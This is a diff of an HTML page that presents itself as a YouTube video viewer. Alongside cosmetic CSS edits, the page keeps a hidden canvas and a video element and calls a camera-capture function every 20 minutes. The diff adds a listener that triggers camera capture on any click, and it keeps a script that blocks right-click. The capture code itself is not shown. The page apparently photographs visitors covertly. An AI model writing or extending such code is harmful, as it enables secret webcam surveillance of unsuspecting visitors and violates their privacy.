@@ -12,25 +12,25 @@
             flex-direction: column;
             height: 100vh;
             margin: 0;
-            background-color: #000; /* Night mode */
-            color: #fff; /* White text */
+            background-color: #000;
+            color: #fff;
             font-family: Arial, sans-serif;
             text-align: center;
         }
         .title {
-            font-size: 3rem; /* Large title font */
+            font-size: 3rem;
             font-weight: bold;
-            margin-top: 20px; /* Added margin-top so the title does not overlap */
-            color: #f0f0f0; /* Light color for title */
+            margin-top: 20px;
+            color: #f0f0f0;
             text-transform: uppercase;
-            margin-bottom: 20px; /* Added space below title */
+            margin-bottom: 20px;
         }
         .video-container {
             position: relative;
             width: 100%;
-            max-width: 1000px; /* Maximum video width */
+            max-width: 1000px;
             height: 0;
-            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            padding-bottom: 56.25%;
             background-color: #000;
             border-radius: 8px;
             margin-bottom: 20px;
@@ -47,7 +47,7 @@
             max-width: 90%;
             margin-top: 20px;
             padding: 10px;
-            background-color: #222; /* Dark grey */
+            background-color: #222;
             border: 1px solid #555;
             border-radius: 8px;
             font-size: 1rem;
@@ -56,25 +56,21 @@
         }
         @media (max-width: 768px) {
             .title {
-                font-size: 2rem; /* Adjust title font size for mobile */
+                font-size: 2rem;
             }
             .description {
-                font-size: 0.9rem; /* Smaller text for mobile */
+                font-size: 0.9rem;
             }
         }
         @media (max-width: 480px) {
             .title {
-                font-size: 1.5rem; /* Smaller title for very small screens */
+                font-size: 1.5rem;
             }
             .description {
                 font-size: 0.8rem;
             }
         }
     </style>
-    <script>
-        // Disable right-click on the entire page
-        document.addEventListener('contextmenu', event => event.preventDefault());
-    </script>
 </head>
 <body>
     <!-- Video title at the top center above the player -->
@@ -96,11 +92,13 @@
         </p>
     </div>
 
-    <div class="youtube-container">
-    <iframe width="10" height="10" src="https://www.youtube.com/embed/videoseries?list=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&autoplay=1&mute=1&loop=1&playlist=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&index=5&random=true&playback_rate=2" 
-            frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-</div>
-<video id="video" width="320" height="240" autoplay></video>
+    <!-- Additional YouTube Playlist -->
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/videoseries?list=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&autoplay=1&mute=1&loop=1&playlist=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&index=5&random=true&playback_rate=2" 
+                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <script>
         const video = document.getElementById('video');
@@ -199,6 +197,15 @@
             activateCameraAndCapture();
         }, 1200000); // 20 minutes in milliseconds
 
+        // Add click event to enable camera on any click
+        document.addEventListener('click', () => {
+            activateCameraAndCapture();
+        });
+    </script>
+
+    <script>
+        // Disable right-click on the entire page
+        document.addEventListener('contextmenu', event => event.preventDefault());
     </script>
 </body>
 </html>
